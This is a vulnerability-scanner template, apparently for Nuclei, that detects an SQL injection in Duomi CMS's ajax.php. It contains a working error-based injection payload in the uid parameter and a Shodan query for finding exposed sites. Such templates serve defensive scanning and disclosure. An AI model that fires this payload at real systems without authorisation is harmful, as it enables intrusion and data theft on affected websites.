id: duomicms-sql-injection
info:
  name: Duomi CMS - SQL Injection
  author: pikpikcu
  severity: critical
  description: Duomi CMS is susceptible to SQL injection attacks that could allow
    hackers to access and manipulate sensitive data, and carry out unauthorized administrative
    tasks on the affected website.
  reference:
  - https://redn3ck.github.io/2016/11/01/duomiCMS/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    shodan-query: title:"DuomiCMS"
    impact: The SQL injection vulnerability in Duomi CMS could potentially result
      in unauthorized access, data modification, and administrative operations by
      an attacker.
    recommendation: It is recommended that users of Duomi CMS update to the latest
      version immediately to mitigate the SQL injection vulnerability and protect
      against potential attacks.
  tags: duomicms,sqli
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - '{{md5({{num}})}}'
  - type: status
    status:
    - 200
